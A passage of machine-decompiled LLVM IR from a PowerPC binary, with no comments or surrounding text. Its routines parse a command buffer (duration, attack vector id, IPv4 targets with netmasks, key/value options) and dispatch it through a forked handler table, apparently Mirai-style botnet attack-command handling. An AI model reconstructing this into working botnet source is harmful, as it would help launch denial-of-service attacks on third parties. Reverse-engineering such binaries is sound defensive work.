  %v0_10001d88.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10001d84

dec_label_pc_10001d74:                            ; preds = %dec_label_pc_10001d84
  %v1_10001d74 = add i32 %v0_10001d74.in, 12
  %v2_10001d74 = inttoptr i32 %v1_10001d74 to i8*
  %v3_10001d74 = load i8, i8* %v2_10001d74, align 1
  %v4_10001d74 = zext i8 %v3_10001d74 to i32
  %v4_10001d7c = icmp eq i32 %v4_10001d74, %arg3
  br i1 %v4_10001d7c, label %dec_label_pc_10001d90, label %dec_label_pc_10001d84

dec_label_pc_10001d84:                            ; preds = %dec_label_pc_10001d84.preheader, %dec_label_pc_10001d74
  %v0_10001d88 = phi i32 [ %v0_10001d88.pre, %dec_label_pc_10001d84.preheader ], [ %v1_10001d88, %dec_label_pc_10001d74 ]
  %v0_10001d74.in = phi i32 [ %tmp, %dec_label_pc_10001d84.preheader ], [ %v0_10001d74, %dec_label_pc_10001d74 ]
  %v0_10001d74 = add i32 %v0_10001d74.in, 8
  %v1_10001d88 = add i32 %v0_10001d88, -1
  store i32 %v1_10001d88, i32* %ctr.global-to-local, align 4
  %v2_10001d88 = icmp eq i32 %v1_10001d88, 0
  br i1 %v2_10001d88, label %dec_label_pc_10001d8c, label %dec_label_pc_10001d74

dec_label_pc_10001d8c:                            ; preds = %dec_label_pc_10001d84
  ret i32 %arg4

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d74, %dec_label_pc_10001d50
  %v0_10001d90 = phi i32 [ %tmp, %dec_label_pc_10001d50 ], [ %v0_10001d74, %dec_label_pc_10001d74 ]
  %v1_10001d90 = inttoptr i32 %v0_10001d90 to i32*
  %v2_10001d90 = load i32, i32* %v1_10001d90, align 4
  ret i32 %v2_10001d90

; uselistorder directives
  uselistorder i32 %v1_10001d88, { 2, 1, 0 }
  uselistorder i32 %v0_10001d74.in, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001d84, { 1, 0 }
}

define i32 @function_10001d98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10001d98:
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268443096, i32* @lr, align 4
  %v0_10001dd4 = call i32 @function_1000b438()
  %v3_10001dd8 = icmp eq i32 %v0_10001dd4, -1
  br i1 %v3_10001dd8, label %dec_label_pc_10001de8, label %dec_label_pc_10001de0

dec_label_pc_10001de0:                            ; preds = %dec_label_pc_10001d98
  %tmp14 = icmp slt i32 %v0_10001dd4, 1
  br i1 %tmp14, label %dec_label_pc_10001e10, label %dec_label_pc_10001de8

dec_label_pc_10001de8:                            ; preds = %dec_label_pc_10001de0, %dec_label_pc_10001d98
  ret i32 %v0_10001dd4

dec_label_pc_10001e10:                            ; preds = %dec_label_pc_10001de0
  store i32 268443156, i32* @lr, align 4
  %v0_10001e10 = call i32 @function_1000b438()
  %v3_10001e14 = icmp eq i32 %v0_10001e10, -1
  br i1 %v3_10001e14, label %dec_label_pc_10001e38, label %dec_label_pc_10001e1c

dec_label_pc_10001e1c:                            ; preds = %dec_label_pc_10001e10
  %v3_10001e1c = icmp eq i32 %v0_10001e10, 0
  br i1 %v3_10001e1c, label %dec_label_pc_10001e24, label %dec_label_pc_10001e40

dec_label_pc_10001e24:                            ; preds = %dec_label_pc_10001e1c
  %v0_10001e24 = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10001e2c.56 to i32), i32* @lr, align 4
  %v1_10001e28 = call i32 @function_1000cce4(i32 %v0_10001e24)
  store i32 268443184, i32* @lr, align 4
  %v0_10001e2c = call i32 @function_1000b4c8()
  store i32 ptrtoint ([3 x i8]* @global_var_10001e38.57 to i32), i32* @lr, align 4
  %v2_10001e34 = call i32 @function_1000b510(i32 %v0_10001e2c, i32 9)
  br label %dec_label_pc_10001e38

dec_label_pc_10001e38:                            ; preds = %dec_label_pc_10001e70, %dec_label_pc_10001e40, %dec_label_pc_10001e10, %dec_label_pc_10001e8c, %dec_label_pc_10001e24
  %v0_10001e3c = call i32 @function_1000cc60()
  br label %dec_label_pc_10001e40

dec_label_pc_10001e40:                            ; preds = %dec_label_pc_10001e1c, %dec_label_pc_10001e38
  %v3_10001e44 = load i8, i8* @global_var_1001eb14.58, align 1
  %v3_10001e48 = icmp eq i8 %v3_10001e44, 0
  br i1 %v3_10001e48, label %dec_label_pc_10001e38, label %dec_label_pc_10001e50

dec_label_pc_10001e50:                            ; preds = %dec_label_pc_10001e40
  %v4_10001e44 = zext i8 %v3_10001e44 to i32
  %v3_10001e58 = load i32, i32* @global_var_1001eb18.59, align 4
  %v1_10001e60 = inttoptr i32 %v3_10001e58 to i32*
  %v2_10001e60 = load i32, i32* %v1_10001e60, align 4
  %v1_10001e64 = add i32 %v2_10001e60, 4
  %v2_10001e64 = inttoptr i32 %v1_10001e64 to i8*
  %v3_10001e64 = load i8, i8* %v2_10001e64, align 1
  %v4_10001e64 = zext i8 %v3_10001e64 to i32
  %v1_10001e68 = load i32, i32* @r30, align 4
  %v4_10001e68 = icmp eq i32 %v4_10001e64, %v1_10001e68
  br i1 %v4_10001e68, label %dec_label_pc_10001e8c, label %dec_label_pc_10001e70

dec_label_pc_10001e70:                            ; preds = %dec_label_pc_10001e50, %dec_label_pc_10001e78
  %v0_10001e74 = phi i32 [ %v1_10001e74, %dec_label_pc_10001e78 ], [ %v4_10001e44, %dec_label_pc_10001e50 ]
  %v0_10001e70 = phi i32 [ %v1_10001e70, %dec_label_pc_10001e78 ], [ 0, %dec_label_pc_10001e50 ]
  %v1_10001e70 = add i32 %v0_10001e70, 1
  %v1_10001e74 = add i32 %v0_10001e74, -1
  %v2_10001e74 = icmp eq i32 %v1_10001e74, 0
  br i1 %v2_10001e74, label %dec_label_pc_10001e38, label %dec_label_pc_10001e78

dec_label_pc_10001e78:                            ; preds = %dec_label_pc_10001e70
  %v1_10001e78 = mul i32 %v1_10001e70, 4
  %v2_10001e7c = add i32 %v1_10001e78, %v3_10001e58
  %v3_10001e7c = inttoptr i32 %v2_10001e7c to i32*
  %v4_10001e7c = load i32, i32* %v3_10001e7c, align 4
  %v1_10001e80 = add i32 %v4_10001e7c, 4
  %v2_10001e80 = inttoptr i32 %v1_10001e80 to i8*
  %v3_10001e80 = load i8, i8* %v2_10001e80, align 1
  %v4_10001e80 = zext i8 %v3_10001e80 to i32
  %v4_10001e84 = icmp eq i32 %v4_10001e80, %v1_10001e68
  br i1 %v4_10001e84, label %dec_label_pc_10001e8c, label %dec_label_pc_10001e70

dec_label_pc_10001e8c:                            ; preds = %dec_label_pc_10001e78, %dec_label_pc_10001e50
  %v0_10001e8c = phi i32 [ %v2_10001e60, %dec_label_pc_10001e50 ], [ %v4_10001e7c, %dec_label_pc_10001e78 ]
  %v1_10001e8c = inttoptr i32 %v0_10001e8c to i32*
  %v2_10001e8c = load i32, i32* %v1_10001e8c, align 4
  call void @__pseudo_call(i32 %v2_10001e8c)
  br label %dec_label_pc_10001e38

; uselistorder directives
  uselistorder i32 %v1_10001e74, { 1, 0 }
  uselistorder i8 %v3_10001e44, { 1, 0 }
  uselistorder label %dec_label_pc_10001e70, { 1, 0 }
  uselistorder label %dec_label_pc_10001e40, { 1, 0 }
  uselistorder label %dec_label_pc_10001e38, { 3, 0, 1, 4, 2 }
}

define i32 @function_10001eac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001eac:
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001eac = call i32 @__asm_mfcr()
  store i32 %v0_10001eac, i32* %r3.global-to-local, align 4
  %v0_10001ec4 = load i32, i32* @r31, align 4
  %v0_10001edc = load i32, i32* @r24, align 4
  %v0_10001ee4 = load i32, i32* @r26, align 4
  %v0_10001ee8 = load i32, i32* @r27, align 4
  %v0_10001eec = load i32, i32* @r28, align 4
  %v0_10001ef0 = load i32, i32* @r29, align 4
  %tmp25 = icmp ult i32 %arg2, 4
  br i1 %tmp25, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f00

dec_label_pc_10001f00:                            ; preds = %dec_label_pc_10001eac
  %v3_10001f00 = icmp eq i32 %arg2, 4
  %v1_10001f04 = inttoptr i32 %v0_10001eac to i32*
  %v2_10001f04 = load i32, i32* %v1_10001f04, align 4
  store i32 %v2_10001f04, i32* %r25.global-to-local, align 4
  br i1 %v3_10001f00, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f54

dec_label_pc_10001f0c:                            ; preds = %dec_label_pc_10001f00, %dec_label_pc_10002100, %dec_label_pc_10001f6c, %dec_label_pc_10001f60, %dec_label_pc_10001f54, %dec_label_pc_10001eac, %dec_label_pc_10002134
  %v1_10001f20 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10001eac)
  store i32 %v0_10001edc, i32* @r24, align 4
  store i32 %v0_10001ee4, i32* @r26, align 4
  store i32 %v0_10001ee8, i32* @r27, align 4
  store i32 %v0_10001eec, i32* @r28, align 4
  store i32 %v0_10001ef0, i32* @r29, align 4
  store i32 %v0_10001ec4, i32* @r31, align 4
  %v0_10001f50 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10001f50

dec_label_pc_10001f54:                            ; preds = %dec_label_pc_10001f00
  %v3_10001f54 = icmp eq i32 %arg2, 5
  %v1_10001f58 = add i32 %v0_10001eac, 4
  %v2_10001f58 = inttoptr i32 %v1_10001f58 to i8*
  %v3_10001f58 = load i8, i8* %v2_10001f58, align 1
  %v4_10001f58 = zext i8 %v3_10001f58 to i32
  store i32 %v4_10001f58, i32* %r22.global-to-local, align 4
  br i1 %v3_10001f54, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f60

dec_label_pc_10001f60:                            ; preds = %dec_label_pc_10001f54
  %v1_10001f60 = add i32 %v0_10001eac, 5
  %v2_10001f60 = inttoptr i32 %v1_10001f60 to i8*
  %v3_10001f60 = load i8, i8* %v2_10001f60, align 1
  %v4_10001f60 = zext i8 %v3_10001f60 to i32
  store i32 %v4_10001f60, i32* @r26, align 4
  %v3_10001f64 = icmp eq i8 %v3_10001f60, 0
  store i1 false, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10001f64, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10001f64, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f6c

dec_label_pc_10001f6c:                            ; preds = %dec_label_pc_10001f60
  %v1_10001f6c = mul nuw nsw i32 %v4_10001f60, 5
  store i32 %v1_10001f6c, i32* @r27, align 4
  %v1_10001f70 = add i32 %arg2, -6
  store i32 %v1_10001f70, i32* @r28, align 4
  %v2_10001f74 = icmp ult i32 %v1_10001f70, %v1_10001f6c
  br i1 %v2_10001f74, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f6c
  store i32 %v4_10001f60, i32* %r3.global-to-local, align 4
  store i32 268443528, i32* @lr, align 4
  %v2_10001f84 = call i32 @function_1000c548(i32 %v4_10001f60, i32 24)
  store i32 %v2_10001f84, i32* %r3.global-to-local, align 4
  %v0_10001f88 = load i32, i32* @r31, align 4
  %v1_10001f88 = add i32 %v0_10001f88, 6
  store i32 %v1_10001f88, i32* @r29, align 4
  store i32 %v2_10001f84, i32* %r20.global-to-local, align 4
  %v0_10001f90 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10001f90 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10001f90 = or i1 %v0_10001f90, %v1_10001f90
  br i1 %v2_10001f90, label %dec_label_pc_10001fecthread-pre-split, label %dec_label_pc_10001f94

dec_label_pc_10001f94:                            ; preds = %dec_label_pc_10001f7c
  %v0_10001f94 = load i32, i32* @r27, align 4
  store i32 %v2_10001f84, i32* %r11.global-to-local, align 4
  %tmp29 = mul i32 %v0_10001f94, -858993459
  store i32 2, i32* %r10.global-to-local, align 4
  store i32 %tmp29, i32* %r9.global-to-local, align 4
  store i32 %tmp29, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10001fbc

dec_label_pc_10001fbc:                            ; preds = %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge, %dec_label_pc_10001f94
  %v2_10001fc8 = phi i32 [ %v1_10001fd8, %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge ], [ %v2_10001f84, %dec_label_pc_10001f94 ]
  %v0_10001fc4 = phi i32 [ %v0_10001fbc.pre, %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge ], [ %v1_10001f88, %dec_label_pc_10001f94 ]
  %v1_10001fbc = add i32 %v0_10001fc4, 4
  %v2_10001fbc = inttoptr i32 %v1_10001fbc to i8*
  %v3_10001fbc = load i8, i8* %v2_10001fbc, align 1
  %v1_10001fc0 = inttoptr i32 %v0_10001fc4 to i32*
  %v2_10001fc0 = load i32, i32* %v1_10001fc0, align 4
  store i32 %v2_10001fc0, i32* %r9.global-to-local, align 4
  %v1_10001fc4 = add i32 %v0_10001fc4, 5
  store i32 %v1_10001fc4, i32* @r29, align 4
  %v3_10001fc8 = add i32 %v2_10001fc8, 20
  %v4_10001fc8 = inttoptr i32 %v3_10001fc8 to i8*
  store i8 %v3_10001fbc, i8* %v4_10001fc8, align 1
  %v0_10001fcc = load i32, i32* %r9.global-to-local, align 4
  %v1_10001fcc = load i32, i32* %r11.global-to-local, align 4
  %v2_10001fcc = add i32 %v1_10001fcc, 4
  %v3_10001fcc = inttoptr i32 %v2_10001fcc to i32*
  store i32 %v0_10001fcc, i32* %v3_10001fcc, align 4
  %v0_10001fd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001fd0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10001fd0 = add i32 %v1_10001fd0, 16
  %v3_10001fd0 = inttoptr i32 %v2_10001fd0 to i32*
  store i32 %v0_10001fd0, i32* %v3_10001fd0, align 4
  %v0_10001fd4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10001fd4 = trunc i32 %v0_10001fd4 to i16
  %v2_10001fd4 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001fd4 = inttoptr i32 %v2_10001fd4 to i16*
  store i16 %v1_10001fd4, i16* %v3_10001fd4, align 2
  %v0_10001fd8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001fd8 = add i32 %v0_10001fd8, 24
  store i32 %v1_10001fd8, i32* %r11.global-to-local, align 4
  %v0_10001fdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10001fdc = add i32 %v0_10001fdc, -1
  store i32 %v1_10001fdc, i32* %ctr.global-to-local, align 4
  %v2_10001fdc = icmp eq i32 %v1_10001fdc, 0
  br i1 %v2_10001fdc, label %dec_label_pc_10001fe0, label %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge

dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge: ; preds = %dec_label_pc_10001fbc
  %v0_10001fbc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10001fbc

dec_label_pc_10001fe0:                            ; preds = %dec_label_pc_10001fbc
  %v0_10001fe0 = load i32, i32* @r26, align 4
  %v1_10001fe0 = mul i32 %v0_10001fe0, -5
  %v0_10001fe4 = load i32, i32* @r30, align 4
  %v2_10001fe4 = add i32 %v0_10001fe4, %v1_10001fe0
  store i32 %v2_10001fe4, i32* %r9.global-to-local, align 4
  %v1_10001fe8 = add i32 %v2_10001fe4, -6
  store i32 %v1_10001fe8, i32* @r28, align 4
  br label %dec_label_pc_10001fec

dec_label_pc_10001fecthread-pre-split:            ; preds = %dec_label_pc_10001f7c
  %v0_10001fec.pr = load i32, i32* @r28, align 4
  br label %dec_label_pc_10001fec

dec_label_pc_10001fec:                            ; preds = %dec_label_pc_10001fecthread-pre-split, %dec_label_pc_10001fe0
  %v0_10001fec = phi i32 [ %v0_10001fec.pr, %dec_label_pc_10001fecthread-pre-split ], [ %v1_10001fe8, %dec_label_pc_10001fe0 ]
  %v3_10001fec = icmp eq i32 %v0_10001fec, 0
  store i32 0, i32* %r21.global-to-local, align 4
  br i1 %v3_10001fec, label %dec_label_pc_100020f0, label %dec_label_pc_10001ff8

dec_label_pc_10001ff8:                            ; preds = %dec_label_pc_10001fec
  %v0_10001ff8 = load i32, i32* @r29, align 4
  %v1_10001ff8 = inttoptr i32 %v0_10001ff8 to i8*
  %v2_10001ff8 = load i8, i8* %v1_10001ff8, align 1
  %v3_10001ff8 = zext i8 %v2_10001ff8 to i32
  store i32 %v3_10001ff8, i32* @r24, align 4
  %v3_10001ffc = icmp eq i8 %v2_10001ff8, 0
  store i1 false, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10001ffc, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10001ffc, label %dec_label_pc_100020c8, label %dec_label_pc_10002004

dec_label_pc_10002004:                            ; preds = %dec_label_pc_10001ff8
  store i32 %v3_10001ff8, i32* %r3.global-to-local, align 4
  store i32 268443664, i32* @lr, align 4
  %v2_1000200c = call i32 @function_1000c548(i32 %v3_10001ff8, i32 8)
  store i32 %v2_1000200c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000200c, i32* %r21.global-to-local, align 4
  %v0_10002014 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002014 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10002014 = or i1 %v0_10002014, %v1_10002014
  br i1 %v2_10002014, label %dec_label_pc_100020c8, label %dec_label_pc_10002018

dec_label_pc_10002018:                            ; preds = %dec_label_pc_10002004
  %v0_10002018 = load i32, i32* @r28, align 4
  %v1_10002018 = add i32 %v0_10002018, -1
  %v4_10002018 = icmp eq i32 %v1_10002018, 0
  store i32 %v1_10002018, i32* %ctr.global-to-local, align 4
  br i1 %v4_10002018, label %dec_label_pc_100020f0, label %dec_label_pc_10002024

dec_label_pc_10002024:                            ; preds = %dec_label_pc_10002018
  %v0_10002024 = load i32, i32* @r29, align 4
  %v1_10002024 = add i32 %v0_10002024, 1
  %v2_10002024 = inttoptr i32 %v1_10002024 to i8*
  %v3_10002024 = load i8, i8* %v2_10002024, align 1
  store i32 %v1_10002024, i32* %r9.global-to-local, align 4
  %v3_1000202c = add i32 %v2_1000200c, 4
  %v4_1000202c = inttoptr i32 %v3_1000202c to i8*
  store i8 %v3_10002024, i8* %v4_1000202c, align 1
  %v0_10002030 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10002030 = add i32 %v0_10002030, -1
  store i32 %v1_10002030, i32* %ctr.global-to-local, align 4
  %v2_10002030 = icmp eq i32 %v1_10002030, 0
  br i1 %v2_10002030, label %dec_label_pc_100020f0, label %dec_label_pc_10002034

dec_label_pc_10002034:                            ; preds = %dec_label_pc_10002024
  store i32 %v1_10002030, i32* %r11.global-to-local, align 4
  %v0_10002038 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002038 = add i32 %v0_10002038, 1
  %v2_10002038 = inttoptr i32 %v1_10002038 to i8*
  %v3_10002038 = load i8, i8* %v2_10002038, align 1
  %v4_10002038 = zext i8 %v3_10002038 to i32
  %v1_10002040 = add i32 %v0_10002030, -2
  store i32 %v1_10002040, i32* @r29, align 4
  %v2_10002044 = icmp slt i32 %v1_10002040, %v4_10002038
  br i1 %v2_10002044, label %dec_label_pc_100020f0, label %dec_label_pc_1000204c

dec_label_pc_1000204c:                            ; preds = %dec_label_pc_10002034
  %v1_1000204c = add i32 %v0_10002038, 2
  store i32 %v1_1000204c, i32* @r28, align 4
  %v0_10002050 = load i32, i32* %r3.global-to-local, align 4
  %v1_10002050 = add i32 %v0_10002050, 8
  store i32 %v1_10002050, i32* %r23.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10002094

dec_label_pc_10002060:                            ; preds = %dec_label_pc_10002094
  %v5_100020bc = icmp eq i32 %v2_100020bc, 0
  br i1 %v5_100020bc, label %dec_label_pc_100020f0, label %dec_label_pc_10002064

dec_label_pc_10002064:                            ; preds = %dec_label_pc_10002060
  %v1_10002064 = load i32, i32* @r28, align 4
  %v2_10002064 = add i32 %v1_10002064, %v0_100020bc
  %v3_10002064 = inttoptr i32 %v2_10002064 to i8*
  %v4_10002064 = load i8, i8* %v3_10002064, align 1
  store i32 %v2_10002064, i32* %r3.global-to-local, align 4
  %v1_1000206c = add i32 %v2_10002064, 1
  store i32 %v1_1000206c, i32* %r9.global-to-local, align 4
  %v2_10002070 = load i32, i32* @r30, align 4
  %v3_10002070 = add i32 %v2_10002070, 4
  %v4_10002070 = inttoptr i32 %v3_10002070 to i8*
  store i8 %v4_10002064, i8* %v4_10002070, align 1
  %v0_10002074 = load i32, i32* %r11.global-to-local, align 4
  %v1_10002074 = add i32 %v0_10002074, -1
  %v4_10002074 = icmp eq i32 %v1_10002074, 0
  %v0_10002078 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002078 = add i32 %v0_10002078, 1
  store i32 %v1_10002078, i32* @r28, align 4
  br i1 %v4_10002074, label %dec_label_pc_100020f0, label %dec_label_pc_10002080

dec_label_pc_10002080:                            ; preds = %dec_label_pc_10002064
  %v0_10002080 = load i32, i32* %r3.global-to-local, align 4
  %v1_10002080 = add i32 %v0_10002080, 1
  %v2_10002080 = inttoptr i32 %v1_10002080 to i8*
  %v3_10002080 = load i8, i8* %v2_10002080, align 1
  %v4_10002080 = zext i8 %v3_10002080 to i32
  store i32 %v1_10002074, i32* %r9.global-to-local, align 4
  %v1_10002088 = add i32 %v0_10002074, -2
  store i32 %v1_10002088, i32* @r29, align 4
  %v2_1000208c = icmp slt i32 %v1_10002088, %v4_10002080
  br i1 %v2_1000208c, label %dec_label_pc_100020f0, label %dec_label_pc_10002094

dec_label_pc_10002094:                            ; preds = %dec_label_pc_10002080, %dec_label_pc_1000204c
  %v0_10002098 = phi i32 [ %v4_10002080, %dec_label_pc_10002080 ], [ %v4_10002038, %dec_label_pc_1000204c ]
  %v1_10002098 = add nuw nsw i32 %v0_10002098, 1
  store i32 %v1_10002098, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100020a0.60 to i32), i32* @lr, align 4
  %v2_1000209c = call i32 @function_1000c548(i32 %v1_10002098, i32 1)
  store i32 %v2_1000209c, i32* %r3.global-to-local, align 4
  %v0_100020a0 = load i32, i32* @r27, align 4
  %v1_100020a0 = add i32 %v0_100020a0, 1
  store i32 %v1_100020a0, i32* @r27, align 4
  %v1_100020a4 = load i32, i32* @r30, align 4
  %v2_100020a4 = inttoptr i32 %v1_100020a4 to i32*
  store i32 %v2_1000209c, i32* %v2_100020a4, align 4
  %v0_100020a8 = load i32, i32* @r28, align 4
  %v0_100020ac = load i32, i32* @r31, align 4
  %v0_100020b0 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100020b0, i32* @r30, align 4
  store i32 268443832, i32* @lr, align 4
  %v3_100020b4 = call i32 @function_1000abe8(i32 %v2_1000209c, i32 %v0_100020a8, i32 %v0_100020ac)
  store i32 %v3_100020b4, i32* %r3.global-to-local, align 4
  %v0_100020b8 = load i32, i32* @r27, align 4
  %v1_100020b8 = load i32, i32* @r24, align 4
  %v4_100020b8 = icmp eq i32 %v0_100020b8, %v1_100020b8
  %v0_100020bc = load i32, i32* @r31, align 4
  %v1_100020bc = load i32, i32* @r29, align 4
  %v2_100020bc = sub i32 %v1_100020bc, %v0_100020bc
  store i32 %v2_100020bc, i32* %r11.global-to-local, align 4
  %v0_100020c0 = load i32, i32* %r23.global-to-local, align 4
  %v1_100020c0 = add i32 %v0_100020c0, 8
  store i32 %v1_100020c0, i32* %r23.global-to-local, align 4
  br i1 %v4_100020b8, label %dec_label_pc_100020c8, label %dec_label_pc_10002060

dec_label_pc_100020c8:                            ; preds = %dec_label_pc_10002094, %dec_label_pc_10002004, %dec_label_pc_10001ff8
  %v0_100020c8 = call i32 @function_1000bb0c()
  %v2_100020d0 = inttoptr i32 %v0_100020c8 to i32*
  store i32 0, i32* %v2_100020d0, align 4
  %v0_100020d4 = load i32, i32* %r22.global-to-local, align 4
  %v0_100020d8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100020d8, i32* %r3.global-to-local, align 4
  %v0_100020dc = load i32, i32* @r26, align 4
  %v0_100020e0 = load i32, i32* %r20.global-to-local, align 4
  %v0_100020e4 = load i32, i32* @r24, align 4
  %v0_100020e8 = load i32, i32* %r21.global-to-local, align 4
  store i32 268443888, i32* @lr, align 4
  %v6_100020ec = call i32 @function_10001d98(i32 %v0_100020d8, i32 %v0_100020d4, i32 %v0_100020dc, i32 %v0_100020e0, i32 %v0_100020e4, i32 %v0_100020e8)
  store i32 %v6_100020ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_10002080, %dec_label_pc_10002064, %dec_label_pc_10002060, %dec_label_pc_10002034, %dec_label_pc_10002024, %dec_label_pc_10002018, %dec_label_pc_10001fec, %dec_label_pc_100020c8
  %v0_100020f0 = load i32, i32* %r20.global-to-local, align 4
  %v3_100020f0 = icmp eq i32 %v0_100020f0, 0
  br i1 %v3_100020f0, label %dec_label_pc_10002100, label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_100020f0
  store i32 %v0_100020f0, i32* @r3, align 4
  store i32 268443904, i32* @lr, align 4
  %v0_100020fc = call i32 @function_1000c5b8()
  store i32 %v0_100020fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_100020f0, %dec_label_pc_100020f8
  %v0_10002100 = load i32, i32* %r21.global-to-local, align 4
  %v3_10002100 = icmp eq i32 %v0_10002100, 0
  br i1 %v3_10002100, label %dec_label_pc_10001f0c, label %dec_label_pc_10002108

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10002100
  %v0_10002108 = load i32, i32* @r24, align 4
  %tmp27 = icmp slt i32 %v0_10002108, 1
  br i1 %tmp27, label %dec_label_pc_10002134, label %dec_label_pc_10002110

dec_label_pc_10002110:                            ; preds = %dec_label_pc_10002108
  br label %dec_label_pc_10002114

dec_label_pc_10002114:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002110
  %v0_1000212c6 = phi i32 [ %v0_10002108, %dec_label_pc_10002110 ], [ %v0_1000212c, %dec_label_pc_1000212c ]
  %v0_1000211c = phi i32 [ %v0_10002100, %dec_label_pc_10002110 ], [ %v0_10002134.pre, %dec_label_pc_1000212c ]
  %v0_10002114 = phi i32 [ 0, %dec_label_pc_10002110 ], [ %v1_1000212c, %dec_label_pc_1000212c ]
  %v1_10002114 = mul i32 %v0_10002114, 8
  %v1_10002118 = add i32 %v0_10002114, 1
  store i32 %v1_10002118, i32* @r31, align 4
  %v2_1000211c = add i32 %v1_10002114, %v0_1000211c
  %v3_1000211c = inttoptr i32 %v2_1000211c to i32*
  %v4_1000211c = load i32, i32* %v3_1000211c, align 4
  store i32 %v4_1000211c, i32* @r3, align 4
  %v3_10002120 = icmp eq i32 %v4_1000211c, 0
  br i1 %v3_10002120, label %dec_label_pc_1000212c, label %dec_label_pc_10002128

dec_label_pc_10002128:                            ; preds = %dec_label_pc_10002114
  store i32 268443948, i32* @lr, align 4
  %v0_10002128 = call i32 @function_1000c5b8()
  store i32 %v0_10002128, i32* %r3.global-to-local, align 4
  %v0_1000212c.pre = load i32, i32* @r24, align 4
  %v1_1000212c.pre = load i32, i32* @r31, align 4
  %v0_10002134.pre.pre = load i32, i32* %r21.global-to-local, align 4
  br label %dec_label_pc_1000212c

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_10002114, %dec_label_pc_10002128
  %v0_10002134.pre = phi i32 [ %v0_1000211c, %dec_label_pc_10002114 ], [ %v0_10002134.pre.pre, %dec_label_pc_10002128 ]
  %v1_1000212c = phi i32 [ %v1_10002118, %dec_label_pc_10002114 ], [ %v1_1000212c.pre, %dec_label_pc_10002128 ]
  %v0_1000212c = phi i32 [ %v0_1000212c6, %dec_label_pc_10002114 ], [ %v0_1000212c.pre, %dec_label_pc_10002128 ]
  %v4_1000212c = icmp eq i32 %v0_1000212c, %v1_1000212c
  br i1 %v4_1000212c, label %dec_label_pc_10002134, label %dec_label_pc_10002114

dec_label_pc_10002134:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002108
  %v0_10002134 = phi i32 [ %v0_10002100, %dec_label_pc_10002108 ], [ %v0_10002134.pre, %dec_label_pc_1000212c ]
  store i32 %v0_10002134, i32* @r3, align 4
  store i32 268443964, i32* @lr, align 4
  %v0_10002138 = call i32 @function_1000c5b8()
  store i32 %v0_10002138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001f0c

; uselistorder directives
  uselistorder i32 %v0_1000212c, { 1, 0 }
  uselistorder i32 %v1_1000212c, { 1, 0 }
  uselistorder i32 %v0_10002114, { 1, 0 }
  uselistorder i32 %v2_100020bc, { 1, 0 }
  uselistorder i32 %v0_100020bc, { 1, 0 }
  uselistorder i32 %v2_10002064, { 1, 0, 2 }
  uselistorder i32 %v1_10002030, { 0, 2, 1 }
